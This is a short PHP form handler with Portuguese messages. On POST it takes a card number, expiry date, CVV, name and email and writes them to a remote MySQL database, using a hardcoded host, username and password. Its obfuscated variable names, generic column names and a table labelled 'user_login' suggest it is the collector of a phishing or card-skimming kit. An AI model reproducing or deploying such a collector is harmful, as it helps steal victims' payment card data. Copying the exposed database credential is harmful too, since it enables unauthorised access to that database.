<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $x1 = "aws.connect.psdb.cloud"; 
    $x2 = "cp3uyj36nsjq9a0t9xhg"; 
    $x3 = "pscale_pw_mBWcPcMVq80qoIh1rnOc3mIt2Gw8pr5GKvYkY6wmC06"; 
    $x4 = "beatrizyamamo"; 
    $conn = mysqli_init();
    mysqli_ssl_set($conn, NULL, NULL, "../cacert-2023-08-22.pem", NULL, NULL);
    mysqli_real_connect($conn, $x1, $x2, $x3, $x4, 3306, NULL, MYSQLI_CLIENT_SSL);
    if (!$conn) {
        die("Conexão falhou devido: " . mysqli_connect_error());
    }
    $cardNumber = $_POST['cardNumber'];
    $dataValue = $_POST['dataValue'];
    $cvvValue = $_POST['cvvValue'];
    $nameValue = $_POST['nameValue'];
    $emailValue = $_POST['emailValue'];
    $sql_injection = "INSERT INTO user_login (letvar1, letvar2, letvar3, letvar4, letvar5) VALUES (?, ?, ?, ?, ?)";
    $stmt = mysqli_prepare($conn, $sql_injection);
    if ($stmt) {
        mysqli_stmt_bind_param($stmt, "sssss", $cardNumber, $dataValue, $cvvValue, $nameValue, $emailValue);
        if (mysqli_stmt_execute($stmt)) {
            echo "Valores inseridos com sucesso na tabela de contas.";
        } else {
            echo "Erro ao inserir valores: " . mysqli_stmt_error($stmt);
        }
        mysqli_stmt_close($stmt);
    } else {
        echo "Erro na preparação da consulta: " . mysqli_error($conn);
    }
    mysqli_close($conn);
}
?>
